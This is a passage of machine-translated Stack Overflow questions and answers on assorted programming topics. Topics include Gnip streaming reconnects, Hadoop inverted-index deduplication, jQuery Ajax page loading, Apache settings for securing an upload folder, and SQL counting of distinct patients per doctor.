问题是连接有时会意外关闭。我联系了 gnip，他们的日志说断开连接不是他们的错。

这一切都超出了我的正常范围。我确定 curl 正在发送某种错误，但我不知道如何找到它以记录它。

这是我到目前为止编写的代码的副本：http: [//pastebin.com/jpHzvbTF](http://pastebin.com/jpHzvbTF)

我喜欢直接的“这是你解决它的方法”，但我也很想知道一些要阅读的术语，这可能会导致我找到自己的解决方案。

我已经阅读[了 curl / php 中的 Keep-alive，](https://stackoverflow.com/questions/6374738/keep-alive-in-curl-php)但我发现它与建议的时间并不相关。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-07T20:14:47.040

我在一家公司工作，该公司是 Gnip 的客户，使用的产品与您使用的相同。我们的代码是 Java，而不是 PHP，所以我可能无法为您提供很大的帮助，但这是我在使用这些提要时发现的：

1.  流式 HTTP 并不是人们想象的那样。在您所在的位置和 Gnip 端点所在的位置之间可能会出现很多问题。
2.  您将需要构建逻辑来检测断开连接并尝试重新连接。同样，我不确定您将如何使用 cURL 和 PHP 来执行此操作。在 Java 中，对我们有用的是输入流上的读取超时和连接超时以强制异常，因此我们断开连接并重试，但您也必须小心这些 - 太短的 TCP 读取超时会看到您不断地重新连接，这会在 Gni​​p 的 UI 中产生非常奇怪的行为。然而，使用这样的东西可以让你捕捉到 Gnip 未能发送他们的 keep-alive 换行符并适当地循环你的连接的状态。
3.  Gnip 会定期更新他们的软件，并在他们的条款中说明这一点。在这些更新期间，他们可能（将）断开您的连接，您需要重新连接。除非它们的末端有错误，否则此断开通常会发出正确的信号并且不会使您的连接处于不良状态，因此无论您用来检测断开的连接是否会触发，您可以重新连接，一切都很好。

我希望我能给你更好的建议，告诉你如何处理你所使用的特定技术所遇到的问题。稍微深入研究一下流式 HTTP（或 Keep-Alive HTTP 会话），看看这是否能让您无所适从。一定要弄清楚如何捕获任何类型的断开连接，然后重新连接。

Gnip 已经开始建议人们实现重新连接退避逻辑，这意味着您的重新连接将立即开始，并且在每次连续重新连接失败时，等待 n*2 < 10（例如）秒，其中 n 是连接数迄今为止的尝试，然后重试。Twitter 自己要求将其作为其流媒体服务的一部分，而 Gnip 只是建议这样做（毕竟这是一项付费服务​​），但如果你想让你的 Gnip UI 不因尝试失败而变得混乱，我会推荐它。

在大多数情况下，我对 Gnip 的体验非常好。但是流式 HTTP 是一种非常不完美的技术（正如我们已经发现的那样）。有一种有点幼稚的想法，即您可以连接一次并从此过上幸福的生活。刚开始的时候我也觉得会是这样，现在我有点愤世嫉俗了。如果我有我的 druthers，我将永远不会支持构建在 Streaming HTTP 之上的生产系统以及我自己网络之外的服务。我宁愿获得 FTP 丢弃，因为对于您可能正在谈论的那种卷，这一切都是一件令人头疼的事情。不幸的是，该产品线不提供它们。

祝你好运。

# hadoop - hadoop 倒排索引不重复文件名

> ID：10305435
> 
> 赞同：1
> 
> 时间：2012-04-24T20:21:12.453
> 
> 标签：hadoop, inverted-index

我的输出是：

word , file ----- ------ wordx Doc2, Doc1, Doc1, Doc1, Doc1, Doc1, Doc1, Doc1

我想要的是：

word , file ----- ------ wordx Doc2, Doc1

```
public static class LineIndexMapper extends MapReduceBase
        implements Mapper<LongWritable, Text, Text, Text> {

    private final static Text word = new Text();
    private final static Text location = new Text();

    public void map(LongWritable key, Text val,
            OutputCollector<Text, Text> output, Reporter reporter)
            throws IOException {
        FileSplit fileSplit = (FileSplit) reporter.getInputSplit();
        String fileName = fileSplit.getPath().getName();
        location.set(fileName);

        String line = val.toString();
        StringTokenizer itr = new StringTokenizer(line.toLowerCase());
        while (itr.hasMoreTokens()) {
            word.set(itr.nextToken());
            output.collect(word, location);
        }
    }
}

public static class LineIndexReducer extends MapReduceBase
        implements Reducer<Text, Text, Text, Text> {

    public void reduce(Text key, Iterator<Text> values,
            OutputCollector<Text, Text> output, Reporter reporter)
            throws IOException {

        boolean first = true;
        StringBuilder toReturn = new StringBuilder();
        while (values.hasNext()) {
            if (!first) {
                toReturn.append(", ");
            }
            first = false;
            toReturn.append(values.next().toString());
        }

        output.collect(key, new Text(toReturn.toString()));
    }
} 
```

为了获得最佳性能 - 我应该在哪里跳过重复出现的文件名？映射，减少或两者兼而有之？ps：我是编写MR任务的初学者，也试图用我的问题弄清楚编程逻辑。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:34:25.703

您将只能删除 Reducer 中的重复项。为此，您可以使用不允许重复的 Set。

```
public void reduce(Text key, Iterator<Text> values,
        OutputCollector<Text, Text> output, Reporter reporter)
        throws IOException {

    // Text's equals() method should be overloaded to make this work
    Set<Text> outputValues = new HashSet<Text>();

    while (values.hasNext()) {
      // make a new Object because Hadoop may mess with original
      Text value = new Text(values.next());

      // takes care of removing duplicates
      outputValues.add(value);
    }

    boolean first = true;
    StringBuilder toReturn = new StringBuilder();
    Iterator<Text> outputIter = outputValues.iter();
    while (outputIter.hasNext()) {
        if (!first) {
            toReturn.append(", ");
        }
        first = false;
        toReturn.append(outputIter.next().toString());
    }

    output.collect(key, new Text(toReturn.toString()));
} 
```

**编辑：**根据克里斯的评论将值的副本添加到设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:07:42.270

您可以通过进行本地地图聚合和引入组合器来提高性能 - 基本上您希望减少在映射器和化简器之间传输的数据量

本地地图聚合是一个概念，您可以在其中维护类似 LRU 的输出对的地图（或集合）。在您的情况下，当前映射器文档的一组单词（假设每个地图都有一个文档）。这样，您可以在集合中查找单词，并且仅在集合尚未包含该单词时才输出 K,V 对（表明您尚未为其输出条目）。如果集合不包含单词，则输出单词，docid pair，并用单词更新集合。

如果集合太大（比如 5000 或 10000 个条目），则将其清除并重新开始。这样，您将显着地看到映射器输出的值的数量（如果您的值域或值集很小，那么单词就是一个很好的例子）。

您也可以在组合器阶段引入您的减速器逻辑

一旦警告的最后一句话 - 在将 Key / Value 对象添加到集合中时要小心（就像在 Matt D 的回答中一样），hadoop 在引擎盖下重新使用对象，所以如果你得到意想不到的结果，请不要感到惊讶引用 - 始终创建对象的副本。

有一篇关于本地地图聚合的文章（用于字数统计示例），您可能会发现它很有用：

*   [http://wikidoop.com/wiki/Hadoop/MapReduce/Mapper#Map_Aggregation](http://wikidoop.com/wiki/Hadoop/MapReduce/Mapper#Map_Aggregation)

# dynamics-crm-2011 - 针对不同汇总开发的 crm 2011 解决方案

> ID：10305436
> 
> 赞同：1
> 
> 时间：2012-04-24T20:21:15.747
> 
> 标签：dynamics-crm-2011

我有几个 CRM 2011 开发图像和一个测试、培训和生产环境。所有环境目前都在 rollup 4 上，假设我应用 rollup 7 来测试、训练和生产我部署的针对 rollup 4 开发的托管解决方案是否有任何问题？以前我遇到过这样的问题，开发人员向我传递了针对汇总 2 开发的解决方案，但测试、训练和生产仅在汇总 1 上，因此无法安装！但假设生产总是领先或相同，我假设应该没有问题？

问候理查德

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:17:05.667

我最近就同样的问题开了一张票。

只要您不需要与特定元素一起引入的元素，就不会依赖于汇总。解决方案本身独立于汇总

> 托管解决方案可用于任何 CRM 组织，独立于汇总级别。如果需要，您可以使用属性“minimumversion”从解决方案端请求最小汇总级别。这可用于确保您的客户在导入您的解决方案之前安装了最小汇总。

另请参阅[维护托管解决方案](http://msdn.microsoft.com/en-us/library/gg328109#BKMK_RequireMinimumVersion)

> 默认情况下，每个托管解决方案都可以安装在任何 Microsoft Dynamics CRM 2011 和 Microsoft Dynamics CRM Online 组织中。但是，您可以限制解决方案的安装，使其无法安装到早期版本。例如，您可能需要在安装解决方案之前安装特定的服务包。
> 
> 如果导出托管解决方案并提取内容，则可以编辑包含解决方案清单的 solution.xml 文件。根元素包含 version 和 minimumversion 属性。version 属性描述了您用于导出解决方案的版本。minimumversion 属性默认值为“5.0.0.0”。增加此值以指定安装解决方案所需的最低版本。设置此值后，选择托管解决方案的所有提取文件，包括您编辑的 solution.xml 文件，并创建一个压缩文件。将此托管解决方案分发给您的客户。

# jsf-2 - h:selectOneMenu 重新显示页面后未从模型中读取值

> ID：10305441
> 
> 赞同：0
> 
> 时间：2012-04-24T20:21:38.740
> 
> 标签：jsf-2, cdi

我偶然发现了一个奇怪的问题，我试图解决一整天。我未能在下面的简单示例中重现它，但也许有人可以给我一些想法。

视图代码：

```
<h:selectOneMenu id="color"
  value="#{testModel.color}" required="true"
  converter="#{colorConverter}">
    <f:selectItems id="colorList"
      value="#{testModel.colorList}"
      var="colorVar" itemLabel="#{colorVar.name}" itemValue="#{colorVar}"/>
</h:selectOneMenu> 
```

会话范围模型：

```
@javax.inject.Named
@javax.enterprise.context.SessionScoped
public class TestModel implements Serializable {
    private Color color;
    //color getters and setters

    private static final List<Color> colorList;

    static {
      // in real example I initialize this list from database
      colorList = new ArrayList<Color>();
      colorList.add(Color.getRedColor());
      colorList.add(Color.getGreenColor());
      colorList.add(Color.getBlueColor());
    }

    public List<Color> getColorList() {
      return colorList;
    }

    public String save() {
      //doing some stuff
      // stay on the same page
      return null;
    }
} 
```

颜色转换器：

```
@Named
@ApplicationScoped
public class ColorConverter implements Converter {

    @Override
    public Object getAsObject(FacesContext context, UIComponent component,
            String value) {
        return value != null ? Color.valueOf(value) : null;
    }

    @Override
    public String getAsString(FacesContext context, UIComponent component,
            Object value) {
        if (value instanceof Color) {
            return ((Color) value).getName();
        }
        return null;
    }
} 
```

这个简单的例子工作正常。但在现实生活中，`Color`对象是`DTO`从域对象映射而来的。我尝试只初始化一次颜色列表，并在转换器中使用它的项目，以便`ColorConverter#getAsObject`从颜色列表中返回一个项目。

所以，问题是这样的。在该`Update Model`阶段中，所选项目被正确转换并设置为模型。然后在该`Invoke Application`阶段`TestModel#save`调用返回 null 的方法，这意味着应该重新显示同一页面。但是页面重新加载后，列表会再次重新初始化，并且选定的项目会被重置。我希望它显示保存在模型中的选定项目。

# jquery-ui - 带有拆分按钮和下拉菜单的 Jquery 移动导航栏

> ID：10305443
> 
> 赞同：0
> 
> 时间：2012-04-24T20:21:40.810
> 
> 标签：jquery-ui, jquery-mobile

我需要一个带有拆分按钮的下拉菜单...类似于由拆分按钮组成的导航栏，每个按钮都会有一些文本和一个箭头，如果您单击它调用处理程序的文本（将显示/隐藏内容），如果您单击箭头，它会在按钮下方打开一个下拉菜单。

我想我可以使用 JQuery 移动拆分列表来做到这一点，但我仍然需要水平列出按钮并在它们下方打开一个下拉列表......

这就是我到目前为止所拥有[的](http://jsfiddle.net/uince/ZZUTK/12/)

当点击图标时，我仍然需要打开下拉菜单，例如[HERE](http://jsfiddle.net/pektB/)但点击图标时。

那么我该怎么做呢？有没有办法用导航栏或插件来解决它？

请注意，我不能使用正常的下拉菜单，因为触摸屏没有鼠标悬停事件......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:37:38.633

与其尝试使用拆分列表，不如为每个拆分列表项创建两个导航按钮。一个会有文本，另一个会有图标：

```
<div data-role="foooter" data-position="fixed">
    <div class="ui-grid-c">
        <div class="ui-block-a">
            <a data-role="button" data-shadow="false" data-corners="false" href="#">Text 1</a>
        </div>
        <div class="ui-block-b">
            <a data-role="button" data-icon="delete" data-iconpos="notext" data-shadow="false" data-corners="false" href="#">Text 2</a>
        </div>
        <div class="ui-block-c">
            <a data-role="button" data-shadow="false" data-corners="false" href="#">Text 2</a>
        </div>
        <div class="ui-block-d">
            <a data-role="button" data-icon="home" data-iconpos="notext" data-shadow="false" data-corners="false" href="#">Text 2</a>
        </div>
    </div>
</div> 
```

这是一个演示：http: [//jsfiddle.net/neSDT/](http://jsfiddle.net/neSDT/)

它当然需要抛光，但这可能会让你开始。

# android - 与 App Engine 同步教程

> ID：10305448
> 
> 赞同：0
> 
> 时间：2012-04-24T20:22:16.057
> 
> 标签：android, android-c2dm

我正在尝试 Android 开发者资源部分中的与 App Engine 同步教程。我安装了 GPE、SDK，设置了 C2DM 帐户，并更新了我所有的软件。创建和调试项目的说明非常简单易懂。但是生成的代码有以下警告：“import android.accounts.OperationCanceledException is never used”和“import android.accounts.AuthenticatorException is never used”。这是好的/正常的，可以忽略吗？
我无法让生成的应用程序一起工作。所以现在我只是试图识别和消除问题。谢谢你的帮助。射线

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:29:31.137

这些警告只是意味着那些 import 语句是不必要的。通过删除这些导入行（或通过按 CMD+SHFT+O 或 CTRL+SHFT+O 来“组织”您的导入）来删除这些警告是安全的。但这不应该给您带来任何其他问题——尽管有这些警告，您仍然应该能够构建和运行。

# php - 使用 PHP 提供图像非常慢

> ID：10305452
> 
> 赞同：1
> 
> 时间：2012-04-24T20:22:35.040
> 
> 标签：php, performance, image, .htaccess, alias

我允许我的网站用户上传图片，然后我使用 PHP 脚本提供图片。但是，这明显比静态链接慢。

我使用 PHP 提供图像的原因是因为我试图阻止人们访问存储图像的文件夹。

我应该使用 .htaccess 文件吗？我也在考虑 httpd 中的别名，但不确定如何使用它或者它是否适合 - 我可以使用它引用根目录外的文件夹吗？

任何帮助将非常感激。

谢谢

`header("Content-type: " . filetype($file) . "\n"); header("Content-Disposition: inline; filename=\"{$image}\"\n"); header("Content-Length: ".(string)(filesize($file))); @readfile($file);`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T22:40:45.923

`Options -Indexes`在标签内使用`Directory`以禁用索引。但是，您应该比这更进一步。

为了安全和一般文件系统卫生，您应该将资产（图像等）保存在与代码分开的目录中。

然后您可以将其添加到您的 apache 配置中：

```
<Directory /directory/where/assets/are>
    Order Allow,Deny
    Allow from all
    Options None
    AllowOverride None
    <IfModule mod_php5.c>
        RemoveHandler .php
        RemoveType .php
        php_flag engine off
    </IfModule>
</Directory> 
```

这将禁止将文件作为资产目录中的脚本执行，并禁止文件列表，但允许任何人下载这些文件。以这种方式使用用户上传的文件保护目录很重要，因为它们可能会上传恶意 php 脚本，然后您可以托管这些脚本。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-24T20:24:22.250

使用带有单行的 .htaccess 文件：

```
IndexIgnore * 
```

然后，用户可以访问该文件夹，但看不到其中的任何内容。

或者，添加一个名为`index.html`但将其留空的文件（或包含“您可能无法查看此页面”消息）

# crystal-reports - 在 Crystal Reports SQL 查询中使用复合条件

> ID：10305457
> 
> 赞同：1
> 
> 时间：2012-04-24T20:23:00.357
> 
> 标签：crystal-reports, crystal-reports-xi

我正在尝试调整我的查询以考虑复合条件语句，即：

```
({tablea.fielda} <> 5566 And Not ({tablea.fieldb} like '%889009%)) 
```

最初的问题是 Crystal 会采用该语句并删除外部括号并彼此独立地执行语句。我认为我可以通过将整个语句放在“NOT”语句中并颠倒条件来解决问题，如下所示：

```
 Not ({tablea.fielda} = 5566 And ({tablea.fieldb} like '%889009%)) 
```

尽管 Crystal 确实反转了条件并将条件分组，但它现在正在将中心更改`and`为`or`.

这是在我刚刚修改之前创建的报告，因此，我不想创建会导致我返回并更改报告中的所有字段的视图或存储过程。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:54:52.717

您的第二个代码片段是（其中一种）处理此问题的正确方法。

`Not ({tablea.fielda} = 5566 And ({tablea.fieldb} like '%889009%))`

[水晶只是通过德摩根定律](http://en.wikipedia.org/wiki/De_Morgan%27s_laws)简化了陈述。

`{tablea.fielda}<>5566 or {tablea.fieldb} not like '%889009%`

逻辑是等价的。

# jquery - 如何使用 Ajax + Jquery 加载网页的一部分

> ID：10305458
> 
> 赞同：1
> 
> 时间：2012-04-24T20:23:04.913
> 
> 标签：jquery

我需要选择器方面的帮助。我想用 Ajax 和 jquery 加载网页的一部分。

这是我的 Ajax 代码

```
$(document).ready(function(){                       
$(".equipe").click(function(event){
    event.preventDefault();                                 
    var page = null;                    
    page=($(this).attr("href"));                    
    $.ajax({                     
        url: page,                    
        cache: false,                                           
        success: function(data) {   
            alert(data);            
            var $response=$(data);
            alert($(data).filter(".contenu").html());
            $("#contenu").empty();                          
            $("#contenu").append($response.filter('.contenu').html());          
            Cufon.refresh();                    
        }                   
    });             
}); 
```

});

第一个警报窗口给了我所有

这是我的 HTML

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="author" content="A6tance informatique" />
<meta name="description" content="" />
<meta name="keywords" content="" />
<title>Salon Reviens</title>
<script type="text/javascript" src="js/jquery-1.3.2.min.js"></script>

 <!-- Style sheets -->
<link rel="stylesheet" href="css/reset.css" />
<link rel="stylesheet" href="css/960.css" />
<link href="css/style.css" rel="stylesheet" type="text/css" />
<!--[if IE]><link rel="stylesheet" type="text/css" href="css/ie.css" /><![endif]-->

<!-- jQuery framework and plugins -->
<script type="text/javascript" src="js/jquery-1.3.2.min.js"></script>
<script type="text/javascript" src="js/jquery.easing.js"></script>

<!-- Font replacement (Cufon) -->
<script type="text/javascript" src="js/cufon-yui.js"></script>
<script type="text/javascript" src="js/GeosansLight_500.font.js"></script>
<script type="text/javascript" src="js/myriad_400.font.js"></script>

<!-- custom.js contains rules for many parts of the site (sliders, portfolio, etc.) -->
<script type="text/javascript" src="js/custom.js"></script>
<!--Superfish -->
<script type="text/javascript" src="js/hoverIntent.js"></script>
<script type="text/javascript" src="js/superfish.js"></script>
<!-- IE6 PNG transparency fix -->
<!--[if IE 6]>
<script type="text/javascript" src="js/DD_belatedPNG_0.0.8a-min.js"></script>       
<script type="text/javascript">DD_belatedPNG.fix('img,.sf-menu,.shadow-bg,.portfolio-sections,.thumb,.nav-left-corner,.side li a,.nav-right-corner,.piecemakerframe,.button-1,.button-2,.inquire-button,.search,.sf-menu li li,.partners li a,.email a,.phone a,.www a,.copyright,.search-box'); /* Add more CSS rules for elements you add if you need a png fix for them */</script>      
<![endif]-->
</head>
<body class="content">
<div class="container_12"> 
    <!-- LOGO -->
    <div class="logo-container">
        <a href="#" title="">
            <img src="images/logo.png" width="214px" height="143px" alt="logo Salon Reviens" style="margin-top:-15px;"/>
        </a>
    </div>
  <!-- /logo-container --> 
  <!-- NAVIGATION -->
  <div class="navigation-wrap" style="top:-20px;">
    <div class="nav-right-corner"></div>
    <ul class="sf-menu">
      <li class="current_page_item"><a href="index.html">Accueil</a></li>
      <li><a href="equipe.html">L'Équipe</a></li>
      <li><a href="#">Services</a></li>
      <li> <a href="#">Produits</a></li>
      <li> <a href="#">Contact</a> </li>
    </ul>
    <div class="nav-left-corner"></div>
  </div>
  <!-- /NAVIGATION -->
  <div class="clear"></div>
  <!-- CONTENT -->
  <div class="grid_12 mar-top"> &nbsp;</div>
  <!-- end .grid_12 -->
  <div class="grid_4">
    <h1>L'Équipe</h1>
  </div>
  <!-- end .grid_4 -->
  <div class="grid_8">
    <h2 class="tag"> Accenderat super his incitatum propositum ad nocendum aliqua mulier vilis, quae ad palatium ut poposcerat intromissa insidias ei latenter obtendi prodiderat a militibus obscurissimis.</h2>
    <br />
    <br />
  </div>
  <!-- end .grid_8 -->
  <div class="clear"></div>
  <div class="grid_12"> <img src="images/shadow-footer-bg.png" width="927" height="47" alt="Shadow" /></div>
  <!-- end .grid_12 -->
  <div class="grid_4 sidebar">
    <h4>Les coiffeuses</h4>
    <ul class="side">
      <li><a class="equipe" href="sylvieGarand.html">Sylvie Garand</a></li>
      <li><a class="equipe" href="karine.html">Karine</a></li>
      <li><a class="equipe" href="nathalie.html">Nathalie</a></li>
      <li><a class="equipe" href="nathalieGervais.html">Nathalie Gervais</a></li>
      <li><a class="equipe" href="cindyLessard.html">Cindy Lessard</a></li>
      <li><a class="equipe" href="melanieLambert.html">Mélanie Lambert</a></li>
      <li><a class="equipe" href="sylvieLebeau.html">Sylvie Lebeau</a></li>
      <li><a class="equipe" href="chantalBeland.html">Chantal Béland</a></li>
      <li><a class="equipe" href="marie-claudeDupuis.html">Marie-Claude Dupuis</a></li>
    </ul>
  </div>
  <!-- end .grid_4 -->
  <div class="grid_8">
    <div id="contenu">
      <div style="float:right; background-color:black; width:200px; height:300px;"></div>
      <h3>Coiffeuse propriétaire du Salon Reviens</h3>
      <p>En tant qu’employeur, j’offre la possibilité à mon équipe de maintenir leurs compétences à jours en leur proposant de suivre des formations de pointe dans le domaine de la coiffure, tant au Québec qu’à l’extérieur du pays.</p>
      <h3>Plus de 25 ans d'expérience</h3>
      <p>Comme coiffeuse pour hommes, je suis constamment à l’écoute des besoins de la clientèle afin d’offrir les produits et services qui lui convient.</p>
      <p>Femme d’affaire active dans le milieu, je contribue au développement économique et social de la région en soutenant divers organismes locaux.</p>
      <p style="text-align:center;">Merci de choisir Salon Reviens depuis 26ans!</p>
    </div>
  </div>
  <!-- end .grid_8 -->
  <div class="clear"></div>
  <div class="grid_12 shadow-bg"></div>
  <!-- end .grid_12 -->
  <div class="grid_12">
    <h3>titre</h3>
    <p>Nam fermentum pellentesque vehicula. Maecenas nec quam felis. Curabitur sed enim eu augue placerat cursus. Cras semper vulputate odio, at vestibulum ante viverra eget. Suspendisse at condimentum quam. Curabitur non lectus sit amet velit dignissim varius. Praesent at rutrum mauris. Integer congue enim ut diam pretium venenatis. Phasellus eu lacus neque, sed gravida mauris. Mauris tincidunt, ligula at feugiat gravida, enim magna lacinia purus, faucibus venenatis eros leo id urna. Morbi non risus neque, ut lacinia risus.</p>
    <br />
  </div>
  <!-- end .grid_12 -->
  <div class="clear"></div>
</div>
<!-- /container_12 -->
<div class="clear"></div>
<!-- FOOTER -->
<div class="footer_bg">
  <div class="container_12">
    <div class="grid_6"> <img src="images/shadow-divider-2.png" width="19" height="207" alt="Divider" class="vr-divider"/>
      <div class="news">
        <h4><a href="http://maps.google.ca/maps?f=q&amp;source=embed&amp;hl=fr&amp;geocode=&amp;q=550+Bd+St+Laurent+E+Louiseville,+QC++J5V+2R5&amp;sll=46.257039,-72.926653&amp;sspn=0.01175,0.026822&amp;ie=UTF8&amp;hq=&amp;hnear=550+Boulevard+Saint+Laurent+Est,+Louiseville,+Qu%C3%A9bec+J5V+2T3&amp;t=m&amp;ll=46.257568,-72.927246&amp;spn=0.014836,0.03768&amp;z=14&amp;iwloc=A" target="_blank">Nous trouver</a></h4>
        <iframe width="400" height="150" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="http://maps.google.ca/maps?f=q&amp;source=s_q&amp;hl=fr&amp;geocode=&amp;q=550+Bd+St+Laurent+E+Louiseville,+QC++J5V+2R5&amp;sll=46.257039,-72.926653&amp;sspn=0.01175,0.026822&amp;ie=UTF8&amp;hq=&amp;hnear=550+Boulevard+Saint+Laurent+Est,+Louiseville,+Qu%C3%A9bec+J5V+2T3&amp;t=m&amp;ll=46.257568,-72.927246&amp;spn=0.014836,0.03768&amp;z=14&amp;iwloc=A&amp;output=embed"></iframe>
      </div>
      <!-- /news --> </div>
    <!-- end .grid_6 -->
    <div class="grid_3"> <img src="images/shadow-divider-2.png" width="19" height="207" alt="Divider" class="vr-divider"/>
      <h4>Horaires</h4>
      <ul class="partners">
        <li><a href="#">Lundi à Mercredi: 9H~17H</a></li>
        <li><a href="#">Jeudi à Vendredi: 9H~21H</a></li>
        <li><a href="#">Samedi: 8H~15H</a></li>
        <li><a href="#">Dimanche: Fermé</a></li>
      </ul>
    </div>
    <!-- end .grid_3 -->
    <div class="grid_3 omega">
      <h4>Pour nous contacter</h4>
      <ul class="contact-info">
        <li class="phone"><a href="#">(819) 228-9933</a></li>
        <li class="email"><a href="#">info@salonreviens.com</a></li>
        <li class="www"><a href="#">www.salonreviens.com</a></li>
      </ul>
    </div>
    <!-- end .grid_3 -->
    <div class="clear"></div>
    <div class="copyright">
      <p>Salon Reviens &copy; 2012 <a href="http://www.a6tance.com">A6tance informatique</a> &bull; Tous Droits Réservés </p>
    </div>
    <!-- /copyright --> </div>
  <!-- /container_12 --> </div>
<!-- /footer_bg -->
</body>
</html> 
```

我要加载的页面与此页面完全相同。所以我应该找到#contenu。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-04T13:15:29.900

在您的第二个警报中，您正在过滤“.contenu”，这意味着您正在搜索一个名为 contenu 的类。然而，在您的 HTML 中只有一个 ID“contenu”。简而言之，alert($(data).filter("#contenu").html()); 应该给你你在这一点上所期望的结果。

# php - 在线上传和禁止直接访问的文件夹权限配置 - 403错误

> ID：10305467
> 
> 赞同：0
> 
> 时间：2012-04-24T20:23:52.340
> 
> 标签：php, file-upload, permissions, http-status-code-403

我们正在尝试为我们的用户创建一个表单，他们可以将图像上传到我们的网站。假设我们正在将所有图像上传到文件夹 images/uploads。

如果此文件夹的权限设置为

> 777,

它工作得很好，因为所有权限都被授予。但如果有人在浏览器上键入：mydomain.com/images/uploads，任何入侵者都可以访问所有上传的文件。

如果我们将权限更改为

> 711

现在禁止（403 错误）入侵者直接访问 mydomain.com/images/uploads 但我们的用户无法再上传文件，因为我们收到 php 错误“权限被拒绝”

这种情况下的最佳配置是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T20:37:49.210

您可以使用`.htaccess`来阻止访问目录列表

```
 Options -Indexes 
```

您也可以使用它来防止图像热链接

```
RewriteEngine on
RewriteCond %{HTTP_REFERER} !^$
RewriteCond %{HTTP_REFERER} !^http://(www\.)?mydomain.com/.*$ [NC]
RewriteRule \.(gif|jpg)$ http://www.mydomain.com/angryman.gif [R,L] 
```

# sql - SQL Group by 聚合和 Distinct

> ID：10305468
> 
> 赞同：2
> 
> 时间：2012-04-24T20:23:53.483
> 
> 标签：sql, group-by, distinct

给定：

InsuranceCompanies（**cid**，姓名，电话，地址）

医生（**做**、姓名、专业、地址、电话、年龄、cid）

患者（**pid**、姓名、地址、电话、年龄、性别、cid）

访问次数（**vid**、did、pid、date、description）

在哪里

```
cid - 保险公司代码
做了 - 医生代码
pid - 病人代码
vid - 访问代码

```

和一个任务：对于每位医生，返回 20-25 岁（不同）患者的数量：

是 ：

```
SELECT  V.did, COUNT ( V.pid ) 
FROM    (   SELECT  DISTINCT V1.did, V1.pid
            FROM    Visits V1,Patient P
            WHERE   P.pid=V1.pid and P.age >= 20 and  P.age <=25 ) AS V 
GROUP BY    V.did 
```

相当于 ：

```
SELECT  V.did, COUNT (DISTINCT V.pid ) 
FROM    Visits V,Patient P
WHERE   P.pid=V.pid and P.age >= 20 and  P.age <=25
GROUP BY    V.did 
```

它们都是完成任务的好方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:27:33.157

您的第二个查询更适合该任务，并且应该更好地优化。此外，在每个查询中，您都引用了 Visit.age。您不应该加入专利和参考患者年龄吗？

此外，在每次您计算医生的唯一访问时，这不需要不同的声明，因为访问永远不会重复。相反，您应该计算不同的患者 (p.id)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:27:51.230

第二个例子对我来说很好。当这被编译成一个计划时，RDBMS 会从许多算法中找出最好的方法。我认为不需要添加您在第一个版本中介绍的中间步骤。

如果您非常渴望确保自己拥有最佳方法，请查看生成的计划并进行比较。并查看读取、CPU 时间等。

如何做到这一点取决于您使用的特定 RDBMS。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:26:56.323

第一个查询有效，但不是真正常见的做法。

第二个查询是要走的路，更清楚会发生什么。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T20:28:04.727

这是两个不同的查询，可能

1）您正在计算患者和医生之间的不同访问次数，这意味着如果患者两次看医生，您将不会计算它

2）您只是计算医生的访问次数，如果同一患者多次访问，则将被计算两次

所以对于这项任务，1）是正确的答案，但 2）看起来更好

```
SELECT  V.did, COUNT ( V.id ) 
FROM    (   SELECT  DISTINCT V1.did, V1.pid
            FROM    Visits V1
            WHERE V1.age >= 20 and  V1.age <=25 ) AS V  
GROUP BY    V.did 
```

可以更好地写为

```
SELECT  V.did, COUNT ( V.pid ) ### change here
FROM    Visits, ### your joins
            WHERE V1.age >= 20 and  V1.age <=25 
GROUP BY    V.did 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-24T20:38:06.013

您将不得不使用左连接，因为它说`for each doctor`并且您没有显示没有就诊的医生`0`：

```
select d.did, count(distinct p.pid) from doctor d
left join visits v on d.did = v.did
join patients p on v.pid = p.pid
where p.age between 20 and 25
group by d.did 
```

# delegates - Xcode iPhone SDK (5.x) - 在 AppDelegate 中访问 NSString

> ID：10305470
> 
> 赞同：0
> 
> 时间：2012-04-24T20:24:02.557
> 
> 标签：delegates, declared-property

我想`NSString`从`AppDelegate.m`位于内部`ViewController.m`的 .

我有一个*单一视图应用程序*，我想将我的`NSString`使用保存`applicationDidEnterBackground:`在里面`AppDelegate.m`。

`NSString`位于内部`ViewController.m`，并且未在 中声明`AppDelegate.m`。

我试图在其中声明它，`AppDelegate.h`然后在`ViewController.m`（并且反转）中访问它。

`ViewController.h`：

```
@interface MyAppViewController : UIViewController {
    NSString *MyString;
} 
```

`AppDelegate.m`：

```
- (void)applicationDidEnterBackground:(UIApplication *)application {
   NSUserDefaults * defaults = [NSUserDefaults standardUserDefaults];
   [defaults setObject:MyString forKey:@"SavedString"];
   [defaults synchronize];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:29:41.260

You can register MyAppViewController to observer UIApplicationDidEnterBackgroundNotification like this:

```
[[NSNotificationCenter defaultCenter] addObserver:self
        selector:@selector(goToBackground:) 
        name:@"UIApplicationDidEnterBackgroundNotification"
        object:nil]; 
```

and in the method `goToBackground` you can save in NSUserDefaults the `MyString`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:29:03.123

